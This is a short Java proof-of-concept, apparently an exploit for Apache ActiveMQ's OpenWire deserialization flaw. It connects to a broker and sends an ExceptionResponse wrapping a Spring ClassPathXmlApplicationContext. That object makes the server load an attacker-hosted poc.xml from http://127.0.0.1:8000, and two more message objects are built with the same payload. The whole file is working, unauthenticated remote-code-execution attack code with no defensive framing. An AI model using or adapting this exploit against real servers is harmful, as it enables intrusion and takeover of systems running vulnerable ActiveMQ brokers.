/**
 * @Projectname: demo
 * @Filename: Demo
 * @Author: T0ngMystic
 * @Data:2023/12/21 16:08
 * @Description: unauthorized
 */

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ConnectionError;
import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.command.MessageAck;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.*;

public class Demo {
    public static void main(String[] args) throws Exception {

        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
        ActiveMQConnection connection = (ActiveMQConnection)connectionFactory.createConnection();
        connection.start();
        Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
//      messageProducer.send(message);
        ExceptionResponse message1 = new ExceptionResponse(new ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml"));
        ConnectionError message2 = new ConnectionError();
        message2.setException(new ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml"));
        MessageAck message3 = new MessageAck();
        message3.setPoisonCause(new ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml"));
        connection.getTransportChannel().oneway(message1);

        connection.close();
    }
}
